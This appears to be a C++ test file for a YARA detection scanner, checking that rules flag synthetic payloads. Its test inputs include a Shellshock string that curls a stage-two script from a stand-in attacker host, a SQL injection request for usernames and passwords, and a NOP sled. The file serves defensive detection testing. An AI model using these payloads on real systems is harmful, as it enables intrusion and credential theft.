/**
 * @file    test_yara.cpp
 * @brief   End-to-end YARA tests: rule compilation, matching, meta.
 *
 * Loads the real rules from the repository's rules/ directory (passed as
 * argv[1] by CTest) and scans synthetic payloads. This validates:
 *   - the rule files are syntactically valid YARA
 *   - the scanner callback plumbing
 *   - meta harvesting (severity / mitre / description)
 *
 * Only built when SENTINELX_WITH_YARA is set.
 *
 * @author  Ash
 * @project SentinelX
 */

#include "test_framework.h"

#include <vector>

#include "../src/yara/YARAScanner.h"


// ============================================================================
//  TESTS
// ============================================================================

static YARAScanner* g_scanner = nullptr;
static std::string  g_rules_dir;

static bool setup(const char* dir) {
    g_rules_dir = dir;
    g_scanner = new YARAScanner();
    if (!g_scanner->loadRules(dir)) {
        std::fprintf(stderr, "FATAL: could not load rules from %s\n", dir);
        return false;
    }
    return true;
}

static void test_rules_loaded() {
    CHECK(g_scanner->ruleCount() >= 8);  // 3 shellcode + 3 malware + 3 http
    auto files = g_scanner->ruleFiles();
    CHECK(files.size() == 3);
    bool found_shell = false, found_mal = false, found_http = false;
    for (const auto& f : files) {
        if (f.find("shellcode") != std::string::npos) found_shell = true;
        if (f.find("malware") != std::string::npos) found_mal = true;
        if (f.find("http_exploits") != std::string::npos) found_http = true;
    }
    CHECK(found_shell);
    CHECK(found_mal);
    CHECK(found_http);
}

static void scanPayload(const char* data, size_t len,
                        std::vector<YaraScanMatch>& out) {
    out = g_scanner->scan(reinterpret_cast<const uint8_t*>(data), len);
}

static const YaraScanMatch* findRule(const std::vector<YaraScanMatch>& ms,
                                     const std::string& rule) {
    for (const auto& m : ms) {
        if (m.rule_name == rule) return &m;
    }
    return nullptr;
}

static void test_nop_sled_match() {
    std::vector<uint8_t> payload(32, 0x90);  // 32-byte NOP sled

    std::vector<YaraScanMatch> ms;
    scanPayload(reinterpret_cast<const char*>(payload.data()), payload.size(),
                ms);

    const YaraScanMatch* m = findRule(ms, "shellcode_nop_sled");
    CHECK(m != nullptr);
    if (m) {
        CHECK_EQ(m->severity, Severity::HIGH);
        CHECK_EQ(m->mitre_id, std::string("T1059"));
        CHECK(!m->matched_strings.empty());
        CHECK_CONTAINS(m->matched_strings[0], "$nop");
        CHECK(!m->description.empty());
    }
}

static void test_ransomware_note_match() {
    const std::string payload =
        "Dear victim, your files have been encrypted by ShadowRat.";

    std::vector<YaraScanMatch> ms;
    scanPayload(payload.data(), payload.size(), ms);

    const YaraScanMatch* m = findRule(ms, "ransomware_encryption_note");
    CHECK(m != nullptr);
    if (m) {
        CHECK_EQ(m->severity, Severity::CRITICAL);
        CHECK_EQ(m->mitre_id, std::string("T1486"));
    }
}

static void test_shellshock_match() {
    const std::string payload =
        "() { :; }; /bin/bash -c 'curl http://evil.example/stage2.sh'";

    std::vector<YaraScanMatch> ms;
    scanPayload(payload.data(), payload.size(), ms);

    const YaraScanMatch* m = findRule(ms, "shellshock_probe");
    CHECK(m != nullptr);
    if (m) {
        CHECK_EQ(m->severity, Severity::CRITICAL);
        CHECK_EQ(m->mitre_id, std::string("T1190"));
    }
}

static void test_sqli_payload_match() {
    const std::string payload =
        "GET /item?id=5 UNION SELECT username, password FROM users HTTP/1.1";

    std::vector<YaraScanMatch> ms;
    scanPayload(payload.data(), payload.size(), ms);

    const YaraScanMatch* m = findRule(ms, "web_sqli_payload");
    CHECK(m != nullptr);
    if (m) {
        CHECK_EQ(m->severity, Severity::HIGH);
    }
}

static void test_clean_payload_no_match() {
    const std::string payload =
        "GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n";

    std::vector<YaraScanMatch> ms;
    scanPayload(payload.data(), payload.size(), ms);
    CHECK_EQ(ms.size(), static_cast<size_t>(0));
}

static void test_hot_reload() {
    const size_t before = g_scanner->ruleCount();
    // Re-load the same directory — should succeed with the same rules
    CHECK(g_scanner->loadRules(g_rules_dir));
    CHECK_EQ(g_scanner->ruleCount(), before);
}

static void test_bad_rules_dir() {
    YARAScanner local;
    CHECK(!local.loadRules("/tmp/definitely_not_a_rules_dir_xyz"));
    CHECK_EQ(local.ruleCount(), static_cast<size_t>(0));
    // scan() on an empty scanner returns nothing (no crash)
    CHECK_EQ(local.scan(reinterpret_cast<const uint8_t*>("a"), 1).size(),
             static_cast<size_t>(0));
}


int main(int argc, char** argv) {
    if (argc < 2) {
        std::fprintf(stderr, "usage: test_yara <rules_dir>\n");
        return 2;
    }
    if (!setup(argv[1])) {
        return 1;
    }

    test_rules_loaded();
    test_nop_sled_match();
    test_ransomware_note_match();
    test_shellshock_match();
    test_sqli_payload_match();
    test_clean_payload_no_match();
    test_hot_reload();
    test_bad_rules_dir();

    delete g_scanner;
    return testfw::summary("test_yara");
}
